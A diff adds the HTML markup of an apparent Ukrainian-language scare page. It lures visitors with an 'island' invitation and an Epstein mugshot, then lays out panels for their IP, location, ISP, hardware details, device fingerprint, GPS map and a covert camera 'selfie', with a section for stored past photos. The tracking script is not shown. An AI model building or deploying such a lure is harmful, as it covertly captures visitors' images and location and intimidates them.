@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Привіт!</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Special+Elite&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+
+  <!-- TAP OVERLAY -->
+  <div id="tapOverlay">
+    <div id="tapBox">
+      <div id="tapEye">👁️</div>
+      <div id="tapHint">Натисни щоб увійти</div>
+    </div>
+  </div>
+
+  <img id="bgPhoto"
+    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRiqzooji22MPvXOvRJhbW7yGe5eeBV7ZweZGdETelUEp-7dNlhbkoMspK4Yme1E6ZScqvhiUGtKIkSoFOk8dB7nhCiFoJuxx1Z7xdbpqk&s=10"
+    onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/Jeffrey_Epstein_mug_shot.jpg/800px-Jeffrey_Epstein_mug_shot.jpg'"
+    alt=""
+  />
+  <div id="scanlines"></div>
+  <div id="vignette"></div>
+
+  <div id="soundDot"><span class="dot"></span> ГОВОРИТЬ...</div>
+
+  <div id="content">
+    <h1 id="greeting">Привіт! 👋</h1>
+    <p id="inviteText">
+      Я запрошую тебе на свій острів...<br/>
+      Тут дуже весело! 🏝️ Приходь — не пожалкуєш.<br/>
+      В нас є сонце, море і хороша компанія 😈
+    </p>
+
+    <div id="selfieSection">
+      <div id="oldPhotoWrap" style="display:none">
+        <div class="selfieLabel">📂 Ти вже був тут раніше:</div>
+        <div id="oldPhotosGrid"></div>
+      </div>
+      <div id="newPhotoWrap">
+        <div class="selfieLabel">📸 А ось і ти...</div>
+        <img id="selfieImg" alt="" />
+        <div id="selfieStatus">Ініціалізація...</div>
+      </div>
+    </div>
+
+    <div id="infoPanel">
+      <div class="row"><span class="lbl">🌐 IP</span><span class="val" id="ip">...</span></div>
+      <div class="row"><span class="lbl">📍 IP-локація</span><span class="val" id="location">...</span></div>
+      <div class="row"><span class="lbl">🏢 Провайдер</span><span class="val" id="isp">...</span></div>
+      <div class="row"><span class="lbl">💻 Браузер</span><span class="val" id="browser">...</span></div>
+      <div class="row"><span class="lbl">🖥️ ОС</span><span class="val" id="os">...</span></div>
+      <div class="row"><span class="lbl">📐 Екран</span><span class="val" id="scr">...</span></div>
+      <div class="row"><span class="lbl">🧠 CPU / RAM</span><span class="val" id="hw">...</span></div>
+      <div class="row"><span class="lbl">🎮 GPU</span><span class="val" id="gpu">...</span></div>
+      <div class="row"><span class="lbl">📶 З'єднання</span><span class="val" id="net">...</span></div>
+      <div class="row"><span class="lbl">🔋 Батарея</span><span class="val" id="bat">...</span></div>
+      <div class="row"><span class="lbl">🗣️ Мова</span><span class="val" id="lang">...</span></div>
+      <div class="row"><span class="lbl">⏰ Час / TZ</span><span class="val" id="tz">...</span></div>
+      <div class="row"><span class="lbl">🔗 Реферер</span><span class="val" id="ref">...</span></div>
+      <div class="row"><span class="lbl">🆔 Fingerprint</span><span class="val" id="fp">...</span></div>
+    </div>
+
+    <div id="gpsStatus">📡 GPS чекає кліку...</div>
+
+    <div id="locationLabel">📍 Визначаємо місце...</div>
+    <div id="mapWrap"><div id="map"></div></div>
+  </div>
+
+  <video id="camVideo" autoplay playsinline muted></video>
+  <canvas id="selfieCanvas" style="display:none"></canvas>
+  <canvas id="fpCanvas" style="display:none"></canvas>
+
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
